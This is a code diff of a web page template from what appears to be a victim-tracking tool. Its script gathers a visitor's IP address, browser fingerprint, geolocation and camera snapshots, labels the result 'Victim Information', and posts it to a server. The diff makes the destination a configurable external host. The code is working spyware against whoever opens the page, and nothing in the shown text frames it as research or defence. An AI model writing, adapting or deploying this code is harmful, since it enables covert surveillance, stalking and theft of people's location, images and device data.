@@ -25,7 +25,13 @@ left:0;
 <script type="text/javascript" defer>
 var uid="<%=uid %>";
 async function gather(){
-var td = '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
+var td="";
+<% if(!t){ %>
+td += '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
+<% }else{ %>
+await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | Time: <%=time %></b>'));
+
+<% } %>
 
 td+="<br><br><b>⏳ Date In Victim's Device :</b> "+new Date()+"<br>";
 var xo=["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
@@ -92,7 +98,7 @@ td+="⚠️ Location API not avilable";
 
 function success(pos) {
 const crd = pos.coords;
-$.post("/location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},(s)=>{
+$.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},(s)=>{
 l=true;
 red();
 });
@@ -113,7 +119,7 @@ const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 
 function post(o){
-$.post("/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{
+$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{
 
 });
 }
@@ -147,7 +153,7 @@ post(canvasData);
 
 
 
-$.post("/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},(s)=>{console.log("done")});
+$.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},(s)=>{console.log("done")});
 
 }
 
